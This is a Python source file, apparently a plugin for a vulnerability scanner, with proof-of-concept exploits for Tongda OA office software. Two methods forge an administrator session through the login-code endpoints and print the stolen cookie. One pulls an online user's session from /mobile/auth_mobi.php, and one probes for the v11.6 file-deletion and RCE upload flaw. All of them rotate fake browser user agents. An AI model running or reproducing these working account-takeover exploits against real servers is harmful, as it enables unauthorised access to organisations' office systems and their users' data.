#!usr/bin/env python
#-*- coding:utf-8 _*-
"""
@author:ximi
@file: OaTongda.py
@time: 2021/07/{DAY}
"""
import re
import sys
import threading
import time
from random import choice
from module import globals
from core.verify import verify
from thirdparty import requests
from module.md5 import random_md5
from thirdparty.requests_toolbelt.utils import dump
import requests
from random import choice
import argparse
import json

class OaTongda():
    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()
        self.USER_AGENTS = [
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
            "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
            "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
            "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
            "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
            "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
            "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
            "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
            "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
            "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"
        ]

    def oa_login_get2017Session_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "通达OA v11.x-v11.5任意用户登录2017"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "通达OA 在現用戶登錄"
        self.vul_info["vul_numb"] = "CMS"
        self.vul_info["vul_apps"] = "TDXK-通达OA"
        self.vul_info["vul_date"] = "2021-6-21"
        self.vul_info["vul_vers"] = "通达OA版本  V11.X < V11.5"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "userLogin"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "通达OA是一套办公系统.2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任意用户伪造登录漏，" \
                                    "未经授权的远程攻击者可以通过精心构造的请求包进行任意用户伪造登录。"
        self.vul_info["cre_date"] = "2021-7-24"
        self.vul_info["cre_auth"] = "ximi"
        headers = {}

        checkUrl = self.url + '/ispirit/login_code.php'
        try:
            headers["User-Agent"] = choice(self.USER_AGENTS)
            res = requests.get(checkUrl, headers=headers)
            resText = json.loads(res.text)
            codeUid = resText['codeuid']
            codeScanUrl = self.url + '/general/login_code_scan.php'
            res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(
                1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'}, headers=headers)
            resText = json.loads(res.text)
            status = resText['status']
            if status == str(1):
                getCodeUidUrl = self.url + '/ispirit/login_code_check.php?codeuid=' + codeUid
                res = requests.get(getCodeUidUrl)
                tmp_cookie = res.headers['Set-Cookie']
                headers["User-Agent"] = choice(self.USER_AGENTS)
                headers["Cookie"] = tmp_cookie
                check_available = requests.get(self.url + '/general/index.php', headers=headers)
                if '用户未登录' not in check_available.text:
                    if '重新登录' not in check_available.text:
                        print('[+]Get Available COOKIE:' + tmp_cookie)
                        self.vul_info["vul_payd"] = checkUrl
                        self.vul_info["vul_data"] = dump.dump_all(check_available).decode('utf-8', 'ignore')
                        self.vul_info["prt_resu"] = "PoCSuCCeSS"
                        self.vul_info["prt_info"] = "[Any Login] [payload:" + checkUrl + "]"
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def oa_login_getV11Session_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "通达OA v11.x-v11.5任意用户登录2011"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "通达OA 在現用戶登錄"
        self.vul_info["vul_numb"] = "CMS"
        self.vul_info["vul_apps"] = "TDXK-通达OA"
        self.vul_info["vul_date"] = "2021-6-21"
        self.vul_info["vul_vers"] = "通达OA版本  V11.X < V11.5"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "userLogin"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "通达OA是一套办公系统.2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任意用户伪造登录漏，" \
                                    "未经授权的远程攻击者可以通过精心构造的请求包进行任意用户伪造登录。"
        self.vul_info["cre_date"] = "2021-7-24"
        self.vul_info["cre_auth"] = "ximi"
        headers = {}


        checkUrl = self.url + '/general/login_code.php'
        try:
            headers["User-Agent"] = choice(self.USER_AGENTS)
            res = requests.get(checkUrl, headers=headers)
            resText = str(res.text).split('{')
            codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
            getSessUrl = self.url + '/logincheck_code.php'
            res = requests.post(
                getSessUrl, data={'CODEUID': '{' + codeUid + '}', 'UID': int(1)}, headers=headers)
            tmp_cookie = res.headers['Set-Cookie']
            headers["User-Agent"] = choice(self.USER_AGENTS )
            headers["Cookie"] = tmp_cookie
            check_available = requests.get(self.url + '/general/index.php', headers=headers)
            if '用户未登录' not in check_available.text:
                if '重新登录' not in check_available.text:
                    print('[+]Get Available COOKIE:' + tmp_cookie)
                    self.vul_info["vul_payd"] = checkUrl
                    self.vul_info["vul_data"] = dump.dump_all(check_available).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoCSuCCeSS"
                    self.vul_info["prt_info"] = "[RCE] [payload:" + checkUrl + "]"
                verify.scan_print(self.vul_info)

        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()
        pass
    def oa_auth_mobi_userLogin_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "通达OA v11.7 在线用户登录漏洞"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "通达OA 在現用戶登錄"
        self.vul_info["vul_numb"] = "CMS"
        self.vul_info["vul_apps"] = "TDXK-通达OA"
        self.vul_info["vul_date"] = "2021-6-21"
        self.vul_info["vul_vers"] = "通达OA < v11.7"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "userLogin"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "通达OA v11.7 中存在某接口查询在线用户，当用户在线时会返回 PHPSESSION使其可登录后台系统"
        self.vul_info["cre_date"] = "2021-7-24"
        self.vul_info["cre_auth"] = "ximi"

        payload_url =self.url+"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
        try:
            print(payload_url)
            response = requests.get(url=payload_url, headers=self.headers, verify=False, timeout=5)
            print(response.text)
            if "RELOGIN" in response.text and response.status_code == 200 or response.status_code == 200 and response.text == "":
                print("\033[31m[x] 目标用户为下线状态 --- {}\033[0m".format(time.asctime(time.localtime(time.time()))))
                self.vul_info["vul_payd"] = payload_url
                self.vul_info["vul_data"] = dump.dump_all(response).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[Loing] [payload:" + payload_url + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

        pass
    def oa_uploadfile_file_rce_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "通达OA v11.6 任意文件删除&RCE"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "通达OA v11.6"
        self.vul_info["vul_numb"] = "CMS"
        self.vul_info["vul_apps"] = "通达OA"
        self.vul_info["vul_date"] = "2021-6-21"
        self.vul_info["vul_vers"] = "2018-2019"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "uploadfile_rce"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "通过任意文件漏洞删除上传点包含的身份验证文件，从而造成未授权访问实现任意文件上传"
        self.vul_info["cre_date"] = "2021-7-24"
        self.vul_info["cre_auth"] = "ximi"
        md = random_md5()
        payload_url= self.url + "/module/appbuilder/assets/print.php"
        try:
            check_url_response = requests.get(url=payload_url)
            if check_url_response.status_code == 200:
                print("\033[32m[o] 存在 /module/appbuilder/assets/print.php 可能含有通达OA v11.6 任意文件删除&RCE漏洞\033[0m")
                self.vul_info["vul_payd"] = payload_url
                self.vul_info["vul_data"] = dump.dump_all(check_url_response).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[uploadfile_rce] [payload:" + payload_url + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()
